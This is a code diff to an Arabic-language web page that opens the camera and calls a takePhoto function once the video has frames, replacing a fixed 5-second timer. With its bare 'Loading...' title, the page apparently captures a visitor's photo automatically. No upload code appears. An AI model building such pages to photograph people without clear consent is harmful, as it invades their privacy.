@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📡 جاري التحميل...</title>
+  <title>📡 تحميل...</title>
   <style>
     body {
       margin: 0;
@@ -31,7 +31,7 @@
   </style>
 </head>
 <body>
-  <div id="status">📡 جاري تشغيل الكاميرا...</div>
+  <div id="status">📡 تجهيز الكاميرا...</div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="300" height="300"></canvas>
@@ -46,15 +46,19 @@
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
-          document.getElementById("status").innerText = "📸 يتم التحضير للتصوير...";
-          setTimeout(() => {
-            takePhoto(stream);
-          }, 5000); // ← 5 ثواني انتظار
-        };
+        // انتظر 5 ثواني على الأقل قبل التحقق
+        setTimeout(() => waitForFrame(video, stream), 5000);
 
       } catch (e) {
         document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
+      }
+    }
+
+    function waitForFrame(video, stream) {
+      if (video.videoWidth > 0 && video.videoHeight > 0) {
+        takePhoto(stream);
+      } else {
+        requestAnimationFrame(() => waitForFrame(video, stream));
       }
     }
 
